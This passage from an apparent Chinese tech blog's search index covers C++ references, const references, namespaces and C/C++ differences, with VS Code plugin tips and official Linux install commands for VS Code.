int &amp;b = a; // b就是a的别名，即b引用了a a =11; // 直接赋值 { int *p = &amp;a; *p = 12; printf("a %d \\n",a); } b = 14; printf("a:%d b:%d", a, b); return 0;} 程序运行的输出结果如下： 12a 12a:14 b:14 引用是 C++ 的概念引用属于 C++ 编译器对 C 语言的扩展，下述代码在 C 语言中不能通过编译，这里不要用 C 语言的语法去思考 b = 11。 123456int main() { int a = 0; int &amp;b = a; b = 11; return 0;} 引用作函数参数 普通引用在声明时必须用其它的变量进行初始化，int &amp;a; 这样的写法是错误的（在结构体内声明除外） 引用作为函数参数声明时，不会进行初始化 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;using namespace std;struct Teacher { char name[64]; int age;};// pT是指向t1的指针，这里相当于修改了t1void printfT(Teacher *pT) { cout &lt;&lt; pT-&gt;age &lt;&lt; endl; pT-&gt;age = 23;}// pT是t1的别名，这里相当于修改了t1void printfT2(Teacher &amp; pT) { cout &lt;&lt; pT.age &lt;&lt; endl; pT.age = 33;}// pT和t1的是两个不同的变量，这里只会修改pT变量，不会修改t1变量void printfT3(Teacher pT) { cout &lt;&lt; pT.age &lt;&lt; endl; pT.age = 43;}int main() { Teacher t1; t1.age = 35; // pT是指向t1的指针 printfT(&amp;t1); printf("t1.age:%d \\n", t1.age); // pT是t1的别名 printfT2(t1); printf("t1.age:%d \\n", t1.age); // pT是形参，相当于t1复制一份数据给pT ---&gt; pT = t1 printfT3(t1); printf("t1.age:%d \\n", t1.age); return 0;} 程序运行输出的结果如下： 12345635t1.age:2323t1.age:3333t1.age:33 引用的使用意义 引用作为其它变量的别名而存在，因此在一些场合可以代替指针 引用相对于指针来说，具有更好的可读性和实用性 使用引用和指针，分别实现交换两个数字的 C++ 代码如下： 引用的本质分析 1）引用在 C++ 中的内部实现是一个常指针，Type &amp; name --&gt; Type * const name 2）C++ 编译器在编译过程中，使用常指针作为引用的内部实现，因此引用所占用的内存空间大小与指针相同 3）从使用的角度看，引用会让人误会其只是一个别名，没有自己的内存空间，这是 C++ 为了实用性而做出的细节隐藏 1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;void func(int &amp;a) { a = 10;}void func(int *const a) { *a = 15;}int main() { int x = 5; func(x); cout &lt;&lt; x &lt;&lt; endl; // 10 func(&amp;x); cout &lt;&lt; x &lt;&lt; endl; // 15 return 0;} 参考上述代码，函数参数间接赋值（指针方式）成立的三个条件如下： a) 定义两个变量（一个实参一个形参） b) 建立关联，实参取地址传给形参 c) 使用 *a 形参去间接的修改实参的值 引用在实现上，只不过是把间接赋值成立的三个条件的后两步和二为一；当实参传给形参引用的时候，是 C++ 编译器帮程序员自动取了一个实参地址传给了形参引用（常量指针）。当我们使用引用语法的时，不需要关心编译器引用是怎么做的；当我们分析奇怪的语法现象时，我们才去考虑 C++ 编译器是怎么做的。 函数返回值是引用当函数返回值为引用时： 若函数返回的是栈变量（如作用域只在函数体内的变量），不能成为其它引用的初始值，不能作为左值使用 若函数返回的是静态变量或全局变量，可以成为其他引用的初始值，即可作为右值使用，也可作为左值使用 函数返回值是基础类型当引用12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;int getAA1() { int a; a = 10; return a;}int &amp; getAA2() { int a; a = 10; return a;}int * getAA3() { int a; a = 10; return &amp;a;}int main() { int a1 = getAA1(); int a2 = getAA2(); int &amp;a3 = getAA2(); int *a4 = getAA3(); cout &lt;&lt; "a1 = " &lt;&lt; a1 &lt;&lt; endl; cout &lt;&lt; "a2 = " &lt;&lt; a2 &lt;&lt; endl; cout &lt;&lt; "a3 = " &lt;&lt; a3 &lt;&lt; endl; // 这里用引用去接受函数的返回值，结果是不是乱码，关键是看返回的内存空间是不是被编译器回收了 cout &lt;&lt; "a4 = " &lt;&lt; *a4 &lt;&lt; endl; // 这里用引用去接受函数的返回值，结果是不是乱码，关键是看返回的内存空间是不是被编译器回收了 return 0;} 程序运行输出的结果如下： 1234a1 = 10a2 = 10a3 = 10 或者 a3 = 乱码a4 = 10 或者 a4 = 乱码 函数返回值是 static 变量当引用值得一提的是，static 关键字修饰变量的时候，变量是一个状态变量。 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;using namespace std;int j() { static int a = 10; a++; printf("a:%d \\n", a); return a;}int &amp; j1() { static int a = 10; a++; printf("a:%d \\n", a); return a;}int * j2() { static int a = 15; a++; printf("a:%d \\n", a); return &amp;a;}int main() { // 错误写法，j()的运算结果是一个数值，没有内存地址，不能当左值，类似 11 = 100; // j() = 3; //当被调用的函数当左值的时候，必须返回一个引用 j1() = 100; j1(); *(j2()) = 200; j2(); return 0;} 程序运行输出的结果如下： 1234a:11a:101a:16a:201 函数返回值是形参当引用12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;int g1(int *p) { *p = 100; return *p;}int &amp; g2(int *p) { *p = 100; return *p;}int main() { int a1 = 10; a1 = g2(&amp;a1); int &amp;a2 = g2(&amp;a1); printf("a1:%d \\n", a1); printf("a2:%d \\n", a2); return 0;} 程序运行输出的结果如下： 12a1:100a2:100 函数返回值是非基础类型如果函数返回的引用不是基础类型，而是一个类，那么此时的情况非常复杂，涉及到 copy 构造函数和 = 操作重载的知识内容，这里暂时不展开讨论。 123456789101112#include &lt;iostream&gt;using namespace std;struct Teachar { char name[64]; int age;};struct Teachar &amp; OpTeacher(struct Teachar &amp;t1) {} 指针引用12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;struct Teacher { char name[64]; int age;};// 二级指针作函数参数int getTe(Teacher **myp) { Teacher *p = (Teacher *) malloc(sizeof(Teacher)); if (p == NULL) { return -1; } memset(p, 0, sizeof(Teacher)); p-&gt;age = 33; *myp = p; return 0;}// 指针引用作函数参数int getTe2(Teacher *&amp;myp) { myp = (Teacher *) malloc(sizeof(Teacher)); if (myp == NULL) { return -1; } myp-&gt;age = 34; return 0;}int main() { Teacher *p = NULL; getTe(&amp;p); printf("age:%d \\n", p-&gt;age); Teacher *pp = NULL; getTe2(pp); printf("age:%d \\n", pp-&gt;age); return 0;} 程序运行输出的结果如下： 12age:33age:34 常引用使用变量初始化 const 引用在 C++ 中可以声明 const 引用，例如 const Type &amp; name = var;，其中的 const 引用让变量拥有只读属性。 12345678910111213141516171819#include &lt;iostream&gt;using namespace std;int main() { int a = 10; const int &amp;b = a; // b = 11; 是错误写法，这里不能通过引用改变a的值，无法通过编译 // 只能用指针来改变引用的值 int * p = (int*) &amp;b; *p = 11; printf("a:%d\\n", a); printf("b:%d\\n", b); printf("&amp;a:%d\\n", &amp;a); printf("&amp;b:%d\\n", &amp;b); return 0;} 程序运行的输出结果如下： 1234a:11b:11&amp;a:1323872140&amp;b:1323872140 1234567891011121314151617181920212223242526#include &lt;iostream&gt;using namespace std;struct Teacher { char name[64]; int age;};// const引用让变量(所指内存空间)拥有只读属性void printTe(const Teacher &amp;t) { // t.age = 11; 是错误写法，无法通过编译}// const 修饰指针和指针指向的内容，那么指针指向的内容都不能更改void printTe2(const Teacher *const pt) { // pt-&gt;age = 11; 是错误写法，无法通过编译}int main() { Teacher t1; t1.age = 33; printTe(t1); printTe2(&amp;t1); return 0;} 使用字面量常量初始化 const 引用1234567891011121314#include &lt;iostream&gt;using namespace std;int main() { const int b = 10; printf("b:%d\\n", &amp;b); // int &amp;a = 19; 若不加const关键字，则编译失败 const int &amp;a = 19; printf("&amp;a:%d \\n", &amp;a); return 0;} const 引用综合使用示例12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;int main() { // 普通引用 int a = 10; int &amp;b = a; // 常量引用，让变量拥有只读属性 const int &amp;c = a; // 常量引用的初始化分为以下两种 // 1.用变量初始化常量引用 { int x = 20; const int &amp;y = x; printf("y:%d \\n", y); } // 2.用字面量常量初始化常量引用 { // int &amp;m = 10; // 错误写法，引用是内存空间的别名，字面量10没有内存空间，没有方法做引用 const int &amp;m = 10; } return 0;} const 引用总结 普通引用 int &amp;e = a; 相当于 int * const e = &amp;a; 常引用 const int &amp; e; 相当于 const int * const e; 当使用字面量常量对 const 引用进行初始化时（如 const int &amp;m = 10;），C++ 编译器会为常量值单独分配内存空间，并将引用名作为这段内存空间的别名 使用字面量常量对 const 引用初始化后（如 const int &amp;m = 10;），将生成一个只读变量，但可以使用指针的方式更改变量的值，示例代码如下： 1234567891011#include &lt;iostream&gt;using namespace std;int main() { const int &amp;a = 100; int *p = (int *) &amp;a; *p = 30; cout &lt;&lt; *p &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;} 程序运行的输出结果如下： 123030 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"C++ 入门基础之一",url:"/posts/8bbc3f09.html",text:'C++ 简介简介： C++ 被认为是一种中级语言，它综合了高级语言和低级语言的特点。 C++ 是 C 的一个超集，事实上，任何合法的 C 程序都是合法的 C++ 程序。 C++ 是一种静态类型的、编译式的、通用的、大小写敏感的、不规则的编程语言，支持过程化编程、面向对象编程和泛型编程。 C++ 是由 Bjarne Stroustrup 于 1979 年在新泽西州美利山贝尔实验室开始设计开发的。C++ 进一步扩充和完善了 C 语言，最初命名为带类的 C，后来在 1983 年更名为 C++。 注意：使用静态类型的编程语言是在编译时执行类型检查，而不是在运行时执行类型检查。 ANSI 标准： ANSI 标准是为了确保 C++ 的便携性 —— 您所编写的代码在 Mac、UNIX、Windows、Alpha 计算机上都能通过编译。由于 ANSI 标准已稳定使用了很长的时间，所有主要的 C++ 编译器的制造商都支持 ANSI 标准。 标准 C++ 的三大组成部分： 核心语言，提供了所有构件块，包括变量、数据类型和常量等。 C++ 标准库，提供了大量的函数，用于操作文件、字符串等。 标准模板库（STL），提供了大量的方法，用于操作数据结构等。 第一个 C++ 程序12345678910111213// 包含C++的头文件#include &lt;iostream&gt;// 使用命名空间 std（标准的命名空间），在这个命名空间中定义了很多 C++ 的标准定义using namespace std;int main() { // cout: 标准输出 // endl: 换行符号，类似 "\\n" // &lt;&lt; 左移操作符: 在C++里面，属于功能的改造（增强），即 C++ 语言的操作符重载 cout &lt;&lt; "hello world" &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 1hello world 关于 endl 与 \\n 的区别： 在 C++ 中，终端输出换行时，用 cout &lt;&lt; ... &lt;&lt; endl 与 \\n 都可以，但二者有小小的区别，用 endl 时会刷新缓冲区，使得栈中的东西刷新一次；但用 \\n 则不会刷新，它只会换行，栈内的数据没有变化。一般情况，二者的这点区别是很小的，在大型的程序中可能会用到，建议用 endl 来换行。 endl 除了写入 \\n 之外，还会调用 flush 函数来刷新缓冲区，将缓冲区里的数据写入文件或屏幕，若考虑效率则可以直接使用 \\n cout &lt;&lt; endl; 等价于 cout &lt;&lt; \'\\n\' &lt;&lt; flush; 程序设计方法介绍面向过程的程序设计方法设计思路 面向过程的结构化程序设计方法，自顶向下、逐步求精。采用模块分解与功能抽象，自顶向下、分而治之。 程序结构 按功能划分为若干个基本模块，形成一个树状结构。 各模块间的关系尽可能简单，功能上相对独立；每一模块内部均是由顺序、选择和循环三种基本结构组成。 其模块化实现的具体方法是使用子程序。 优缺点 优点: 有效地将一个较复杂的程序系统设计任务分解成许多易于控制和处理的子任务，便于开发和维护。 缺点: 可重用性差、数据安全性差、难以开发大型软件和图形界面的应用软件 把数据和处理数据的过程分离为相互独立的实体。 当数据结构改变时，所有相关的处理过程都要进行相应的修改。 每一种相对于老问题的新方法都要带来额外的开销。 图形用户界面的应用程序，很难用过程来描述和实现，开发和维护也都很困难。 面向对象的程序设计方法C++ 完全支持面向对象的程序设计，包括面向对象开发的四大特性： 封装、抽象、继承、多态，更多特性如下： 将数据及对数据的操作方法封装在一起，作为一个相互依存、不可分离的整体（对象）。 对同类型对象抽象出其共性，形成类。 类通过一个简单的外部接口，与外界发生关系。 对象与对象之间通过消息进行通信。 面向对象的软件工程概述面向对象的软件工程是面向对象方法在软件工程领域的全面应用，分别包括: 面向对象的分析（OOA） 面向对象的设计（OOD） 面向对象的编程（OOP） 面向对象的测试（OOT） 面向对象的软件维护（OOSM） 面向过程程序设计：数据结构 + 算法，主要用于解决科学计算问题，用户需求简单而固定，其特点和劣势如下： 特点： 分析解决问题所需要的步骤 利用函数实现各个步骤 依次调用函数解决问题 劣势： 软件可重用性差 软件可维护性差 构建的软件无法满足用户需求 面向对象程序设计：由现实世界建立软件模型，将现实世界中的事物直接映射到程序中，可直接满足用户需求，其特点和优势如下： 特点： 直接分析用户需求中涉及的各个实体 在代码中描述现实世界中的实体 在代码中关联各个实体协同工作解决问题 优势： 构建的软件能够适应用户需求的不断变化 直接利用面向过程方法的优势而避开其劣势 计算圆形的面积面向过程的写法1234567891011121314#include &lt;iostream&gt;using namespace std;int main() { double r = 0; // 圆形的半径 double s = 0; // 圆形的面积 cout &lt;&lt; "请输入圆形的半径："; cin &gt;&gt; r; s = 3.14 * r * r; cout &lt;&lt; "圆形的面积是：" &lt;&lt; s &lt;&lt; endl; return 0;} 面向对象的写法123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Circle {public: double m_r; // 圆形的半径 double m_s; // 圆形的面积public: void setR(double r) { m_r = r; } double getR() { return m_r; } double getS() { m_s = 3.14 * m_r * m_r; return m_s; }};int main() { double r; cout &lt;&lt; "请输入圆形的半径："; cin &gt;&gt; r; Circle circle; circle.setR(r); cout &lt;&lt; "圆形的面积是：" &lt;&lt; circle.getS() &lt;&lt; endl; return 0;} C++ 基础概念命名空间所谓 namespace，是指标识符的各种可见范围。C++ 标准程序库中的所有标识符都被定义于一个名为 std 的 namespace 中。&lt;iostream&gt; 和 &lt;iostream.h&gt; 格式是不一样的，前者没有后缀，实际上在编译器 include 文件夹里面可以看到，二者是两个文件，打开文件就会发现，里面的代码是不一样的。后缀为 .h 的头文件 C++ 标准已经明确提出不再支持了，早些的实现将标准库功能定义在全局命名空间里，即声明在带 .h 后缀的头文件里；C++ 标准为了和 C 区别开，也为了正确使用命名空间，规定头文件不再使用后缀 .h。 &lt;iostream.h&gt; 与 &lt;iostream&gt; 的区别： 当使用 &lt;iostream.h&gt; 时，相当于在 C 中调用库函数，使用的是全局命名空间，也就是早期的 C++ 实现 当使用 &lt;iostream&gt; 的时候，该头文件没有定义在全局命名空间，必须使用 using namespace std; 这样才能正确使用 cout 等关键字 由于 namespace 的概念，使用 C++ 标准程序库的任何标识符时，可以有以下三种写法可选择： 直接指定标识符：例如 std::ostream 而不是 ostream，完整语句为： std::cout &lt;&lt; std::hex &lt;&lt; 3.4 &lt;&lt; std::endl; 使用 using 关键字：using std::cout; using std::endl; using std::cin;，以上语句可以写成 cout &lt;&lt; hex &lt;&lt; 3.4 &lt;&lt; endl; 使用 using namespace std：这种写法是最方便的，例如： using namespace std;，以上语句可以写成 cout &lt;&lt; hex &lt;&lt; 3.4 &lt;&lt; endl; 命名空间 std 内定义的所有标识符都有效（曝光），就好像它们被声明为全局变量一样，那么以上语句就可以这样写 cout &lt;&lt; hex &lt;&lt; 3.4 &lt;&lt; endl;。因为标准库非常的庞大，所以程序员在选择的类的名称或函数名时就很有可能和标准库中的某个名字相同。因此为了避免这种情况所造成的名字冲突，就把标准库中的一切都被放在名字空间 std 中。但这又会带来了一个新问题，无数原有的 C++ 代码都依赖于使用了多年的伪标准库中的功能，它们都是在全局命名空间下的。所以就有了 &lt;iostream.h&gt; 和 &lt;iostream&gt; 等等这样的头文件，一个是为了兼容以前的 C++ 代码，另一个是为了支持新的标准。命名空间 std 封装的是标准程序库的名称，标准程序库为了和以前的头文件区别，一般不加后缀 .h。 命名空间定义及使用语法在 C++ 中，名称（name）可以是符号常量、变量、宏、函数、结构、枚举、类和对象等等。为了避免在大规模程序的设计中，以及在程序员使用各种各样的 C++ 库时，这些标识符的命名发生冲突，标准 C++ 引入了关键字 namespace（命名空间 / 名字空间 / 名称空间 / 名域），这样就可以更好地控制标识符的作用域。std 是 C++ 标准命名空间，C++ 标准程序库中的所有标识符都被定义在 std 中，比如标准库中的类 iostream、vector 等都定义在该命名空间中，使用时要加上 using 声明（如 using namespace std) 或者 using 指示（如 std::string、std::vector&lt;int&gt;）。 C 语言中的命名空间： 标识符之间可能发生冲突 在 C 语言中只有一个全局作用域 C 语言中所有的全局标识符共享同一个作用域 C++ 中的命名空间： 命名空间可以相互嵌套定义 全局作用域也叫默认命名空间 命名空间将全局作用域分成不同的部分 不同命名空间中的标识符可以同名而不会发生冲突 C++ 命名空间定义及使用语法： 命名空间定义的语法：namespace name { … } 命名空间使用的语法：using namespace name; 使用特定命名空间中的变量：using name::variable; 使用默认命名空间中的变量：::variable 默认情况下可以直接使用默认命名空间中的所有标识符 命名空间编程实战1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;using namespace std;// 定义命名空间 NameSpaceAnamespace NameSpaceA { int a = 0;}// 定义命名空间 NameSpaceBnamespace NameSpaceB { int a = 1; // 嵌套定义命名空间 NameSpaceC namespace NameSpaceC { struct Teacher { char name[10]; int age; }; }}int main() { // 声明 std 命名空间后的写法 cout &lt;&lt; "hello world" &lt;&lt; endl; // 不声明 std 命名空间后的写法 std::cout &lt;&lt; "hello world" &lt;&lt; std::endl; // 声明 NameSpaceA 命名空间 using namespace NameSpaceA; // 使用 NameSpaceC 命名空间中的变量 using NameSpaceB::NameSpaceC::Teacher; printf("a = %d\\n", a); printf("a = %d\\n", NameSpaceB::a); Teacher teacher = {"Jim", 20}; printf("teacher.age = %d\\n", teacher.age); printf("teacher.name = %s\\n", teacher.name); return 0;} 程序运行的输出结果如下： 123456hello worldhello worlda = 0a = 1teacher.age = 20teacher.name = Jim C 语言和 C++ 的关系C 语言是在实践的过程中逐步完善起来的，没有深思熟虑的设计过程，使用时存在很多 灰色地带，残留了过多低级语言的特征，直接利用指针进行内存操作，其最终目标是程序执行效率的高效。当面向过程方法论暴露越来越多的缺陷的时候，业界开始考虑在工程项目中引入面向对象的设计方法，而第一个需要解决的问题就是：高效的面向对象语言，并且能够兼容已经存在的代码。C 语言和 C++ 语言的关系如下： C 语言和 C++ 并不是对立的竞争关系 C++ 是 C 语言的加强，是一种更好的 C 语言 C++ 是以 C 语言为基础的，并且完全兼容 C 语言的特性 C 语言 + 面向对象方法论 —&gt; C++ / Objective C C++ 对 C 语言的增强实用性增强C 语言中的变量都必须在作用域开始的位置定义，而 C++ 中更强调语言的 实用性，所有的变量都可以在需要使用时再定义。 1234567int main(int argc, char *argv[]){ int a = 0; printf("hello world\\n"); int b = 13; // C语言编译器中编译报错，但是C++编译器中不会报错 return 0;} 变量检测增强在 C 语言中，重复定义多个同名的全局变量是合法的，但在 C++ 中，不允许定义多个同名的全局变量。C 语言中多个同名的全局变量最终会被链接到全局数据区的同一个地址空间上。 12int g_var;int g_var = 1; // C++直接拒绝这种二义性的做法 struct 类型的增强C 语言的 struct 定义了一组变量的集合，C 编译器并不认为这是一种新的类型，而在 C++ 中的 struct 是一个新类型的定义声明。 123456789101112struct Student{ char name[100]; int age;};int main(int argc, char *argv[]){ Student s1 = {"wang", 1}; // C语言编译器编译报错，C++编译器编译通过 struct Student s2 = {"chen", 1}; // C语言编译器编译通过 return 0;} register 关键字增强register 是运行速度最快的关键字，其作用是请求编译器尽可能地将变量存在 CPU 内部的寄存器中，而不是通过内存寻址访问，以提高程序运行效率。注意这里是尽可能，不是绝对。首先，register 变量必须是能被 CPU 所接受的类型，这通常意味着 register 变量必须是一个单个的值，并且长度应该小于或者等于整型的长度。不过，有些机器的寄存器也能存放浮点数。C 语言中，register 关键字表示 “请求”（不一定成功）让变量直接放进寄存器中，方便访问，但是在 C 语言中不能取 register 变量的地址。C++ 对 register 进行了增强，C++ 编译器会对频繁被调用的变量主动申请为 register，即使没有用 register 关键字声明，它也会这样做。值得一提的是，C++ 编译器当发现程序中需要对 register 变量取地址时，register 对变量的声明会变得无效。 123456int main(int argc, char *argv[]){ register int a = 0; printf("&amp;a = %x\\n", &amp;a); return 0;} 由于寄存器的数量有限，而且某些寄存器只能接收特定类型的数据（如指针和浮点数），因此真正起作用的 register 修饰符的数目和类型都依赖于实际运行程序的机器，而任何多余的 register 修饰符都将被编译器所忽略。在某些情况下，把变量保存在寄存器中反而会降低程序的运行速度，这因为被占用的寄存器不能再用于其它用途；或者变量被使用的次数不够多，不足以抵消装入和存储变量所带来的额外开销。早期的 C 编译器不会自动把变量保存在寄存器中，除非程序员命令它这样做，这时 register 修饰符是 C 语言的一种很有价值的补充。然而，随着编译程序设计技术的进步，在决定哪些变量应该被存到寄存器中时，现代的 C 编译器能比程序员做出更好的决定。实际上，许多编译器都会忽略 register 修饰符，尽管它完全合法，但它仅仅是暗示而不是命令。 作用域限定运算符作用域限定运算符，用于对当前作用域之外的同名变量进行访问，例如在下面的例子中，可以利用 :: 实现在局部变量 a 的作用域内对全局变量 a 的访问。 1234567891011121314#include &lt;iostream&gt;using namespace std;int a;int main() { float a; a = 3.14; ::a = 6; cout &lt;&lt; "local variable a = " &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; "global variable a = " &lt;&lt; ::a &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 12local variable a = 3.14global variable a = 6 新增 Bool 类型关键字C++ 在 C 语言的基本类型系统之上增加了 bool 类型关键字，bool 可取的值只有 true 和 false。理论上 bool 变量只占用一个字节，如果多个 bool 变量定义在一起，可能会各占一个 bit（位），这取决于编译器的实现。true 代表真值，编译器内部用 1 来表示，false 代表非真值，编译器内部用 0 来表示。C++ 编译器会在赋值时将非 0 值转换为 true，0 值转换为 false。 1234567int main(int argc, char *argv[]){ int a; bool b = true; printf("b = %d, sizeof(b) = %d\\n", b, sizeof(b)); return 0;} 程序运行的输出结果如下： 1b = 1, sizeof(b) = 1 三目运算符功能增强12345678910int main(int argc, char *argv[]) int a = 10; int b = 20; // 返回一个最小数，并且给最小数赋值成30 // C 语言中三目运算符是一个表达式 ，表达式不可以做左值，而 C++ 则可以 (a &lt; b ? a : b) = 30; printf("a = %d, b = %d\\n", a, b); return 0;} 程序运行的结果如下： 1a = 30, b = 20 使用三目运算符时，C 语言返回变量的值，C++ 是返回变量本身 C 语言中的三目运算符返回的是变量值，不能作为左值使用 C++ 中的三目运算符可直接返回变量本身，因此可以出现在程序的任何地方 特别注意：C++ 中三目运算符可能返回的值中如果有一个是常量值，则不能作为左值使用，例如 (a &lt; b ? 1 : b )= 30; C 语言如何支持类似 C++ 的三目运算特性呢？当左值的条件：要有内存空间，而 C++ 编译器只是帮助程序员取了一个地址而已，C 语言版的写法为：*(a &lt; b ? &amp;a : &amp;b) = 30 所有的变量和函数都必须声明类型 C 语言默认数据类型在 C++ 编译器中是不合法的，C++ 中所有变量和函数必须声明类型。以下代码在 C 语言中能编译通过，但在 C++ 中会编译报错。 1234567891011121314151617f(i){ printf("i = %d\\n", i);}g(){ return 5;}int main(int argc, char *argv[]){ f(10); printf("g() = %d\\n", g(1, 2, 3, 4, 5)); getchar(); return 0;} 在 C 语言中，int f() 表示返回值为 int，接受任意参数的函数 在 C 语言中，int f(void) 表示返回值为 int 的无参函数 在 C++ 中，int f() 和 int f(void) 具有相同的意义，都表示返回值为 int 的无参函数 C++ 更加强调类型，任意的程序元素都必须显示指明类型 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"VS Code 入门教程之二打造 Markdown 编辑器",url:"/posts/3baa0a8d.html",text:'常用插件文件图标主题 Material Icon Theme，一款非常漂亮的文件图标主题 自动隐藏侧边栏 Auto Hide，支持自动隐藏侧边栏 Markdown 插件Markdown 预览 Markdown Preview Mermaid Support，实时预览 Mermaid 绘图 Markdown Preview Enhanced，支持 Markdown 实时预览等各种强大的功能 Markdown 快捷键 Markdown Shortcuts，支持各种 Markdown 快捷键 Markdown 表格插入 MarkDown Table Format，支持使用快捷键全局格式化 Markdown 表格 Markdown Table，快速插入 Markdown 表格，支持表格自动格式化和自动插入行 Markdown 文档导出 Markdown PDF，Markdown 文档转 PDF 文档 Markdown 语法高亮 Mermaid Markdown Syntax Highlighting，支持 Mermaid 绘图的语法高亮 Markdown 图片粘贴 Markdown QiNiu，支持将粘贴板里的图片上传到七牛图床 Markdown Paste，支持将粘贴板里的图片保存到本地，并将图片的链接自动加入到 Markdown 文档中 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"VS Code 入门教程之一基础使用",url:"/posts/879c28df.html",text:'常用插件文件图标主题 vscode-icons Material Icon Theme 自动隐藏侧边栏 Auto Hide 自动更新关闭 VS Code 自动更新方法一： 打开菜单 File 中 Preferences 子菜单中选择 Settings 项，搜索 update mode，将其设置为 none，如下图所示： 方法二： 打开 查看（View）菜单，选择 命令面板（Command Palette） 菜单项或者使用（Ctrl + Shift + P）快捷键打开命令面板。 在命令面板中，输入 Preferences: Open Settings (JSON)，打开用户配置 JSON 的编辑界面，添加配置内容 "update.mode": "none"。 关闭 VS Code 自动更新插件方法一： 打开菜单 File 中 Preferences 子菜单中选择 Settings 项，搜索 Extensions: Auto Update，取消复选框的选中状态，如下图所示： 方法二： 打开 查看（View）菜单，选择 命令面板（Command Palette） 菜单项或者使用（Ctrl + Shift + P）快捷键打开命令面板。 在命令面板中，输入 Preferences: Open Settings (JSON)，打开用户配置 JSON 编辑界面，添加配置内容 "extensions.autoUpdate": false。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"Linux 安装 VS Code",url:"/posts/d8f0998b.html",text:'前言本文适用于 Debian/Ubuntu、RHEL/Fedora/CentOS、openSUSE/SLE-based、Arch 等 Linux 发行版。 VS Code 安装Debian / Ubuntu 安装软件仓库源和密钥 1234$ wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor &gt; packages.microsoft.gpg$ sudo install -o root -g root -m 644 packages.microsoft.gpg /etc/apt/trusted.gpg.d/$ sudo sh -c \'echo "deb [arch=amd64,arm64,armhf signed-by=/etc/apt/trusted.gpg.d/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main" &gt; /etc/apt/sources.list.d/vscode.list\'$ rm -f packages.microsoft.gpg 更新安装包缓存，并安装 VS Code 123$ sudo apt install apt-transport-https$ sudo apt update$ sudo apt install code RHEL/Fedora/CentOS 安装软件仓库源和密钥 12$ sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc$ sudo sh -c \'echo -e "[code]\\nname=Visual Studio Code\\nbaseurl=https://packages.microsoft.com/yumrepos/vscode\\nenabled=1\\ngpgcheck=1\\ngpgkey=https://packages.microsoft.com/keys/microsoft.asc" &gt; /etc/yum.repos.d/vscode.repo\' 更新安装包缓存，并使用 dnf（Fedora 22 及更高版本） 安装 VS Code 12$ sudo dnf check-update$ sudo dnf install code 或者在旧版本的 CentOS 上使用 yum 安装 VS Code 12$ sudo yum check-update$ sudo yum install code 若 VS Code 成功安装后，在系统的应用菜单栏里找不到快捷启动方式，那么可以通过按下 Alt + F2 快捷键，然后输入 r 重启系统界面；然后导航到应用菜单栏：应用程序 –&gt; 编程 –&gt; Visual Studio Code，双击快捷启动方式的图标即可启动 VS Code。 openSUSE/SLE-based 安装软件仓库源和密钥 12$ sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc$ sudo sh -c \'echo -e "[code]\\nname=Visual Studio Code\\nbaseurl=https://packages.microsoft.com/yumrepos/vscode\\nenabled=1\\ntype=rpm-md\\ngpgcheck=1\\ngpgkey=https://packages.microsoft.com/keys/microsoft.asc" &gt; /etc/zypp/repos.d/vscode.repo\' 更新安装包缓存，并安装 VS Code 12$ sudo zypper refresh$ sudo zypper install code ArchVS Code 有一个社区维护的 Arch 用户存储库包，要从 AUR 获取有关安装的更多信息，请参阅以下 WiKi 条目： 安装 AUR 包。 Snap通过 Snap 安装 